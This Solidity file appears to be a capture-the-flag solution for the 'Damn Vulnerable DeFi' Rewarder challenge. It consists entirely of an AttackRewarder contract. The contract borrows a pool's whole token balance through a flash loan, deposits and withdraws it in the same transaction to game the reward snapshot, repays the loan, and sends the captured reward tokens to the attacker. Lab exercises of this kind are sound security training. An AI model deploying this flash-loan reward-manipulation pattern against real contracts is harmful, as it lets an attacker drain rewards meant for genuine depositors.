// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/FixedPointMathLib.sol";
import "solady/src/utils/SafeTransferLib.sol";
import {RewardToken} from "./RewardToken.sol";
import {AccountingToken} from "./AccountingToken.sol";
import "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract AttackRewarder {
    TheRewarderPool immutable rewardPool;
    FlashLoanerPool immutable loanPool;
    RewardToken immutable rewardToken;
    AccountingToken immutable accToken;
    DamnValuableToken immutable dvToken;

    constructor(
        address _rewardPpool,
        address _rewardToken,
        address _loanPool,
        address _accToken,
        address _dvToken
    ) {
        rewardPool = TheRewarderPool(_rewardPpool);
        loanPool = FlashLoanerPool(_loanPool);
        accToken = AccountingToken(_accToken);
        dvToken = DamnValuableToken(_dvToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack() external {
        loanPool.flashLoan(dvToken.balanceOf(address(loanPool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        dvToken.approve(address(rewardPool), _amount);
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);
        dvToken.transfer(address(loanPool), _amount);
    }
}
